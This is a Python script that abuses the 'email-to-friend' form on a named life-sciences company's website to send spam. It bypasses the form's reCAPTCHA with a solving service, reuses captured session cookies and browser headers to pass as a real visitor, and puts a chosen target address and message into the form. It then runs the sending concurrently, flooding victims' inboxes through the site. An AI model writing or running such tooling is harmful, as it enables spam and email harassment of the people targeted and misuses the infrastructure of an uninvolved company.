from os.path import basename

import requests

from module import Spam

s = 'Thank you'
url = 'https://www.enzolifesciences.com/email-to-friend'
googlekey = '6LdYakAUAAAAAI4ggmWblPh_VXde3pRfmlflPFb2'
cookies = {
    'fe_typo_user': '295b26f4480cda1c477a921e41f5fd4c',
    'ELS_Country1': '217',
    'PHPSESSID': 'rvbhdulob6j8kptqnahpll0s97',
    '_gcl_au': '1.1.743335070.1676380665',
    '_gid': 'GA1.2.2026642097.1676380666',
    'visitor_id2472': '506176455',
    'visitor_id2472-hash': '58a27a156796321d3c5f6dead2bb01439eb723e14789de8c2bbbd5cdf609a5dee44196433fe6e6faabd29cb7906272ba3721a772',
    '_dc_gtm_UA-5503361-2': '1',
    '_ga': 'GA1.1.1268493899.1676380666',
    '_ga_T03PTQMKT8': 'GS1.1.1676382860.2.1.1676382867.53.0.0',
}

headers = {
    'authority': 'www.enzolifesciences.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOK5jlksJ73nKzd3N',
    # 'cookie': 'fe_typo_user=295b26f4480cda1c477a921e41f5fd4c; ELS_Country1=217; PHPSESSID=rvbhdulob6j8kptqnahpll0s97; _gcl_au=1.1.743335070.1676380665; _gid=GA1.2.2026642097.1676380666; visitor_id2472=506176455; visitor_id2472-hash=58a27a156796321d3c5f6dead2bb01439eb723e14789de8c2bbbd5cdf609a5dee44196433fe6e6faabd29cb7906272ba3721a772; _dc_gtm_UA-5503361-2=1; _ga=GA1.1.1268493899.1676380666; _ga_T03PTQMKT8=GS1.1.1676382860.2.1.1676382867.53.0.0',
    'origin': 'https://www.enzolifesciences.com',
    'referer': 'https://www.enzolifesciences.com/email-to-friend',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(pageurl=url, googlekey=googlekey)
        if not cap:
            return
        data = '------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="submitted"\r\n\r\n1\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="id"\r\n\r\n117\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="link"\r\n\r\n\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="formcode"\r\n\r\nemailtofriend\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="your_name"\r\n\r\ntest\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="name"\r\n\r\ntest\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="coments"\r\n\r\ntest\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="x"\r\n\r\n52\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N\r\nContent-Disposition: form-data; name="y"\r\n\r\n6\r\n------WebKitFormBoundaryOK5jlksJ73nKzd3N--\r\n'
        data = data.replace('cap_que', cap).replace('test', self.get_text()).replace('wezxasqw@gmail.com', target)
        response = requests.post('https://www.enzolifesciences.com/email-to-friend', cookies=cookies, headers=headers,
                                 data=data.encode())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
